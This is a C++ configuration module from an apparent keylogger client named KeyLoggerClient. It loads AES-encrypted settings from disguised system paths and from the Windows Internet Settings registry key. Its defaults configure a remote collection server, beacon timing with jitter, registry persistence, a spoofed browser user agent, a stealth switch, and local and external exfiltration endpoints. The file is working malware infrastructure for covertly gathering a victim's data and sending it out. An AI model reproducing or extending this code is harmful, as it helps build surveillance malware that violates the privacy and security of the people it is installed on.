// KeyLoggerClient/src/core/Configuration.cpp
#include "core/Configuration.h"
#include "core/Logger.h"
#include "utils/FileUtils.h"
#include "utils/StringUtils.h"
#include "utils/SystemUtils.h"
#include "security/Encryption.h"    
#include "security/Obfuscation.h"
#include <fstream>
#include <sstream>
#include <algorithm>
#include <vector>
#include <cstdint>
#include <string>

#if PLATFORM_WINDOWS
#include <windows.h>
#include <shlobj.h>
#elif PLATFORM_LINUX
#include <cstdlib>
#endif

// Obfuscated configuration keys
constexpr const char* OBF_KEY_LOG_PATH = "log_path";
constexpr const char* OBF_KEY_SERVER_URL = "server_url";
constexpr const char* OBF_KEY_ENCRYPTION_KEY = "encryption_key";
constexpr const char* OBF_KEY_COLLECTION_INTERVAL = "collection_interval";
constexpr const char* OBF_KEY_JITTER_FACTOR = "jitter_factor";
constexpr const char* OBF_KEY_ENABLE_PERSISTENCE = "enable_persistence";
constexpr const char* OBF_KEY_PERSISTENCE_METHOD = "persistence_method";
constexpr const char* OBF_KEY_REMOVE_ON_EXIT = "remove_on_exit";
constexpr const char* OBF_KEY_COLLECT_SYSTEM_INFO = "collect_system_info";
constexpr const char* OBF_KEY_MAX_FILE_SIZE = "max_file_size";
constexpr const char* OBF_KEY_COMMS_METHOD = "comms_method";
constexpr const char* OBF_KEY_USE_PROXY = "use_proxy";
constexpr const char* OBF_KEY_PROXY_SERVER = "proxy_server";
constexpr const char* OBF_KEY_PROXY_PORT = "proxy_port";
constexpr const char* OBF_KEY_USER_AGENT = "user_agent";
constexpr const char* OBF_KEY_TIMEOUT = "timeout";
constexpr const char* OBF_KEY_NETWORK_MODE = "network_mode";
constexpr const char* OBF_KEY_SAME_WIFI_URL = "same_wifi_server_url";
constexpr const char* OBF_KEY_DIFFERENT_WIFI_URL = "different_wifi_server_url";

// Registry paths (Windows only)
#if PLATFORM_WINDOWS
constexpr const char* OBF_REGISTRY_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings";
constexpr const char* OBF_REGISTRY_KEY = "ProxyServer";
#endif

Configuration::Configuration() {
    SetDefaultValues();
}

Configuration::~Configuration() {
    // Cleanup if needed
}

bool Configuration::LoadConfiguration() {
    LOG_INFO("Loading configuration...");

    // Multiple configuration location fallbacks
    std::vector<std::wstring> configPaths = GetConfigurationPaths();

    for (const auto& path : configPaths) {
        if (utils::FileUtils::FileExists(path)) {
            LOG_INFO("Found configuration file: " + utils::StringUtils::WideToUtf8(path));
            if (LoadFromEncryptedFile(path)) {
                LOG_INFO("Configuration loaded successfully from file");
                return true;
            }
        }
    }

    LOG_INFO("No configuration file found, checking platform-specific locations...");
    
    // Platform-specific configuration loading
#if PLATFORM_WINDOWS
    if (LoadFromRegistry()) {
        LOG_INFO("Configuration loaded from registry");
        return true;
    }
#elif PLATFORM_LINUX
    // Linux configuration loading implementation
    std::vector<std::wstring> linuxConfigPaths = {
        L"/etc/system_config/system.cfg",
        L"~/.config/system_config/config.enc",
        L"/tmp/system_config.bin"
    };
    
    for (const auto& path : linuxConfigPaths) {
        if (utils::FileUtils::FileExists(path)) {
            LOG_INFO("Found Linux configuration file: " + utils::StringUtils::WideToUtf8(path));
            if (LoadFromEncryptedFile(path)) {
                LOG_INFO("Configuration loaded from Linux config");
                return true;
            }
        }
    }
#endif

    LOG_WARN("No external configuration found, using default values");
    return true; // Continue with defaults
}

std::vector<std::wstring> Configuration::GetConfigurationPaths() const {
    std::vector<std::wstring> paths;
    
    // Current directory - convert string to wstring
    std::string currentPathStr = utils::FileUtils::GetCurrentExecutablePath();
    if (!currentPathStr.empty()) {
        std::wstring currentPath = utils::StringUtils::Utf8ToWide(currentPathStr);
        paths.push_back(currentPath + L"\\config.enc");
    }
    
#if PLATFORM_WINDOWS
    // Windows-specific paths
    wchar_t programDataPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath))) {
        paths.push_back(std::wstring(programDataPath) + L"\\SystemConfig\\system.cfg");
    }
    
    // AppData directory - convert string to wstring
    std::string appDataPathStr = utils::FileUtils::GetAppDataPath();
    if (!appDataPathStr.empty()) {
        std::wstring appDataPath = utils::StringUtils::Utf8ToWide(appDataPathStr);
        paths.push_back(appDataPath + L"\\config.enc");
    }
    
    // Temp directory - convert string to wstring
    std::string tempPathStr = utils::FileUtils::GetTempPath();
    if (!tempPathStr.empty()) {
        std::wstring tempPath = utils::StringUtils::Utf8ToWide(tempPathStr);
        paths.push_back(tempPath + L"\\system_config.bin");
    }
#elif PLATFORM_LINUX
    // Linux-specific paths
    paths.push_back(L"/etc/system_config/system.cfg");
    
    // Home directory config
    const char* homeDir = getenv("HOME");
    if (homeDir) {
        std::wstring homePath = utils::StringUtils::Utf8ToWide(homeDir);
        paths.push_back(homePath + L"/.config/system_config/config.enc");
    }
    
    paths.push_back(L"/tmp/system_config.bin");
#endif
    
    return paths;
}

bool Configuration::LoadFromEncryptedFile(const std::wstring& path) {
    try {
        auto encryptedData = utils::FileUtils::ReadBinaryFile(path);
        if (encryptedData.empty()) {
            LOG_WARN("Configuration file is empty: " + utils::StringUtils::WideToUtf8(path));
            return false;
        }

        // Generate decryption key using system fingerprint
        std::string decryptionKey = GenerateConfigurationKey();
        
        std::vector<uint8_t> decryptedBytes = security::Encryption::DecryptAES(
            encryptedData,
            decryptionKey
        );

        if (decryptedBytes.empty()) {
            LOG_ERROR("Failed to decrypt configuration file");
            return false;
        }

        // Convert bytes to string
        std::string decryptedData(decryptedBytes.begin(), decryptedBytes.end());

        // Parse decrypted configuration
        std::stringstream ss(decryptedData);
        std::string line;
        
        while (std::getline(ss, line)) {
            size_t delimiterPos = line.find('=');
            if (delimiterPos != std::string::npos) {
                std::string key = line.substr(0, delimiterPos);
                std::string value = line.substr(delimiterPos + 1);
                
                // Remove carriage return if present
                value.erase(std::remove(value.begin(), value.end(), '\r'), value.end());
                
                m_configValues[key] = value;
                LOG_DEBUG("Config key: " + key + " = " + value);
            }
        }
        
        return true;
    }
    catch (const std::exception& e) {
        LOG_ERROR("Error loading configuration file: " + std::string(e.what()));
        return false;
    }
    catch (...) {
        LOG_ERROR("Unknown error loading configuration file");
        return false;
    }
}

#if PLATFORM_WINDOWS
bool Configuration::LoadFromRegistry() {
    HKEY hKey;
    LSTATUS status = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        OBF_REGISTRY_PATH,
        0,
        KEY_READ,
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        LOG_WARN("Failed to open registry key: " + std::to_string(status));
        return false;
    }

    bool configFound = false;
    char buffer[512];
    DWORD bufferSize = sizeof(buffer);
    
    // Read multiple potential registry values
    std::vector<const char*> registryKeys = {
        OBF_REGISTRY_KEY,
        "ProxyEnable",
        "AutoConfigURL",
        "User Agent"
    };

    for (const auto& regKey : registryKeys) {
        bufferSize = sizeof(buffer);
        if (RegQueryValueExA(hKey, regKey, NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            std::string registryValue(buffer, bufferSize);
            
            // Simple obfuscation removal (example)
            if (registryValue.find("OBF:") == 0) {
                registryValue = security::Obfuscation::DeobfuscateString(registryValue.substr(4));
            }
            
            // Parse configuration from registry value
            ParseRegistryConfiguration(registryValue);
            configFound = true;
        }
    }

    RegCloseKey(hKey);
    return configFound;
}
#endif

void Configuration::ParseRegistryConfiguration(const std::string& registryData) {
    // Simple parsing logic - can be enhanced based on specific format
    std::stringstream ss(registryData);
    std::string item;
    
    while (std::getline(ss, item, ';')) {
        size_t equalsPos = item.find('=');
        if (equalsPos != std::string::npos) {
            std::string key = item.substr(0, equalsPos);
            std::string value = item.substr(equalsPos + 1);
            
            // Trim whitespace
            key = utils::StringUtils::Trim(key);
            value = utils::StringUtils::Trim(value);
            
            m_configValues[key] = value;
        }
    }
}

void Configuration::SetDefaultValues() {
    LOG_DEBUG("Setting default configuration values");
    
    // Get temp path safely - convert string to wstring
    std::string tempPathStr = utils::FileUtils::GetTempPath();
    std::string defaultLogPath;
    
    if (!tempPathStr.empty()) {
        std::wstring tempPath = utils::StringUtils::Utf8ToWide(tempPathStr);
        defaultLogPath = utils::StringUtils::WideToUtf8(tempPath + L"/logs/system.log");
    } else {
        defaultLogPath = "/tmp/logs/system.log"; // Fallback for Linux
    }
    
    // Set default values for all configuration parameters
    m_configValues["log_path"] = defaultLogPath;
    m_configValues["server_url"] = "https://api.research-project.com/collect";
    m_configValues["collection_interval"] = "300000"; // 5 minutes
    m_configValues["jitter_factor"] = "0.2";
    m_configValues["enable_persistence"] = "true";
    m_configValues["persistence_method"] = "registry";
    m_configValues["remove_on_exit"] = "false";
    m_configValues["collect_system_info"] = "true";
    m_configValues["max_file_size"] = "10485760"; // 10MB
    m_configValues["comms_method"] = "https";
    m_configValues["use_proxy"] = "false";
    m_configValues["proxy_server"] = "";
    m_configValues["proxy_port"] = "8080";
    m_configValues["user_agent"] = 
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    m_configValues["timeout"] = "30000"; // 30 seconds
    m_configValues["network_mode"] = "auto";
    m_configValues["same_wifi_server_url"] = "http://192.168.1.100:8080";
    m_configValues["different_wifi_server_url"] = "https://your-external-server.com";
    m_configValues["stealth_enabled"] = "false";
}

std::string Configuration::GenerateConfigurationKey() const {
    // Create system-specific key using hardware information
    std::string systemId = utils::SystemUtils::GetSystemFingerprint();
    std::string baseKey = "BASE_KEY_7F3E2A1D9C4B5A6F"; // Removed OBFUSCATE macro for constexpr
    
    return security::Encryption::GenerateSHA256(systemId + baseKey);
}

std::string Configuration::GetValue(const std::string& key, 
                                   const std::string& defaultValue) const {
    auto it = m_configValues.find(key);
    if (it != m_configValues.end()) {
        return it->second;
    }
    
    LOG_WARN("Configuration key not found: " + key + ", using default: " + defaultValue);
    return defaultValue;
}

// Specific getter implementations
std::string Configuration::GetLogPath() const {
    std::string tempPathStr = utils::FileUtils::GetTempPath();
    std::string defaultPath = tempPathStr.empty() ? "/tmp/logs/system.log" : 
        utils::StringUtils::WideToUtf8(utils::StringUtils::Utf8ToWide(tempPathStr) + L"/logs/system.log");
    
    return GetValue("log_path", defaultPath);
}

std::string Configuration::GetServerUrl() const {
    return GetValue("server_url", "https://api.research-project.com/collect");
}

uint32_t Configuration::GetCollectionInterval() const {
    try {
        return std::stoul(GetValue("collection_interval", "300000"));
    } catch (...) {
        LOG_ERROR("Invalid collection interval, using default 300000ms");
        return 300000;
    }
}

double Configuration::GetJitterFactor() const {
    try {
        return std::stod(GetValue("jitter_factor", "0.2"));
    } catch (...) {
        LOG_ERROR("Invalid jitter factor, using default 0.2");
        return 0.2;
    }
}

bool Configuration::GetEnablePersistence() const {
    std::string value = GetValue("enable_persistence", "true");
    return (value == "true" || value == "1" || value == "yes");
}

std::string Configuration::GetPersistenceMethod() const {
    return GetValue("persistence_method", "registry");
}

bool Configuration::GetRemovePersistenceOnExit() const {
    std::string value = GetValue("remove_on_exit", "false");
    return (value == "true" || value == "1" || value == "yes");
}

bool Configuration::GetCollectSystemInfo() const {
    std::string value = GetValue("collect_system_info", "true");
    return (value == "true" || value == "1" || value == "yes");
}

uint32_t Configuration::GetMaxFileSize() const {
    try {
        return std::stoul(GetValue("max_file_size", "10485760"));
    } catch (...) {
        LOG_ERROR("Invalid max file size, using default 10MB");
        return 10485760;
    }
}

std::string Configuration::GetCommsMethod() const {
    return GetValue("comms_method", "https");
}

bool Configuration::GetUseProxy() const {
    std::string value = GetValue("use_proxy", "false");
    return (value == "true" || value == "1" || value == "yes");
}

std::string Configuration::GetProxyServer() const {
    return GetValue("proxy_server", "");
}

uint16_t Configuration::GetProxyPort() const {
    try {
        return std::stoi(GetValue("proxy_port", "8080"));
    } catch (...) {
        LOG_ERROR("Invalid proxy port, using default 8080");
        return 8080;
    }
}

std::string Configuration::GetUserAgent() const {
    return GetValue("user_agent", 
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
}

uint32_t Configuration::GetTimeout() const {
    try {
        return std::stoul(GetValue("timeout", "30000"));
    } catch (...) {
        LOG_ERROR("Invalid timeout, using default 30000ms");
        return 30000;
    }
}

std::string Configuration::GetNetworkMode() const {
    return GetValue("network_mode", "auto");
}

std::string Configuration::GetSameWifiServerUrl() const {
    return GetValue("same_wifi_server_url", "http://192.168.1.100:8080");
}

std::string Configuration::GetDifferentWifiServerUrl() const {
    return GetValue("different_wifi_server_url", "https://your-external-server.com");
}

std::string Configuration::GetEncryptionKey() const {
    return GetValue("encryption_key", GenerateConfigurationKey());
}

void Configuration::SetValue(const std::string& key, const std::string& value) {
    m_configValues[key] = value;
}

bool Configuration::SaveConfiguration() const {
    try {
        std::stringstream configData;
        for (const auto& pair : m_configValues) {
            configData << pair.first << "=" << pair.second << "\n";
        }
        
        std::string configStr = configData.str();
        std::vector<uint8_t> configBytes(configStr.begin(), configStr.end());
        
        std::vector<uint8_t> encryptedData = security::Encryption::EncryptAES(
            configBytes,
            GenerateConfigurationKey()
        );
        
        // Convert string to wstring for the path
        std::string appDataPathStr = utils::FileUtils::GetAppDataPath();
        if (!appDataPathStr.empty()) {
            std::wstring configPath = utils::StringUtils::Utf8ToWide(appDataPathStr) + L"/config.enc";
            return utils::FileUtils::WriteBinaryFile(configPath, encryptedData);
        }
        return false;
    }
    catch (...) {
        LOG_ERROR("Failed to save configuration");
        return false;
    }
}

bool Configuration::GetStealthEnabled() const {
    std::string value = GetValue("stealth_enabled", "false");
    return (value == "true" || value == "1" || value == "yes");
}